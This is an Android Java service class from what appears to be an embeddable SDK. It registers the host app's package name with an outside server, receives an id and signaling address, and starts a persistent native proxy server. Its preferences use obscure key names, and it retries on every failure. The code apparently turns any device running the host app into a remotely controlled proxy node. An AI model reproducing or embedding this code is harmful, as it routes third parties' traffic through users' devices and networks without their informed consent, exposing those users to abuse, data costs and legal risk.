package com.app.sdk.sdk.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.text.TextUtils;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.content.ContextCompat;

import com.app.sdk.sdk.utils.NotificationUtils;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Objects;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.ResponseBody;

public class ProxyService extends Service {

    private final OkHttpClient client = new OkHttpClient();
    private SharedPreferences preferences;
    private Thread pThread;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        preferences = getSharedPreferences("app_preferences", Context.MODE_PRIVATE);
        startForeground(31337, NotificationUtils.INSTANCE.getProxyNotification(this));
        init();
    }

    public static void startService(Context context) {
        ContextCompat.startForegroundService(context, new Intent(context, ProxyService.class));
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String uuid = preferences.getString("s", "");
        if (!TextUtils.isEmpty(uuid)) {
            poll(uuid);
            start();
        }
        return START_STICKY;
    }

    private void start() {
        if (pThread == null) {
            pThread = new Thread(pRunnable);
            pThread.start();
            return;
        }
        if (pThread.isAlive()) return;
        try {
            pThread.start();
        } catch (Exception e) {
            pThread.interrupt();
            pThread = null;
            start();
        }
    }

    private final Runnable pRunnable = () -> proxylib.Proxylib.startServer(
            preferences.getString("s", ""),
            preferences.getString("s1", "")
    );

    private Request getRequest(String param) {
        return new Request.Builder().url("https://www.neidershark.com/poll?" + param).build();
    }

    private void init() {
        if (!TextUtils.isEmpty(preferences.getString("s", "")) &&
                !TextUtils.isEmpty(preferences.getString("s1", ""))) return;
        client.newCall(getRequest("pkg=" + getApplicationContext().getPackageName())).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                init();
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try (ResponseBody responseBody = response.body()) {
                    String data = Objects.requireNonNull(responseBody).string();
                    try {
                        JSONObject json = new JSONObject(data);
                        preferences.edit().putString("s", json.getString("uuid")).apply();
                        preferences.edit().putString("s1", json.getString("signaling")).apply();
                        start();
                    } catch (JSONException e) {
                        init();
                    }
                }
            }
        });
    }

    private void poll(String uuid) {
        client.newCall(getRequest("uuid=" + uuid)).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try (ResponseBody responseBody = response.body()) {
                    String data = Objects.requireNonNull(responseBody).string();
                    try {
                        JSONObject json = new JSONObject(data);
                        preferences.edit().putString("s1", json.getString("signaling")).apply();
                    } catch (JSONException ignore) {
                    }
                }
            }
        });
    }
}
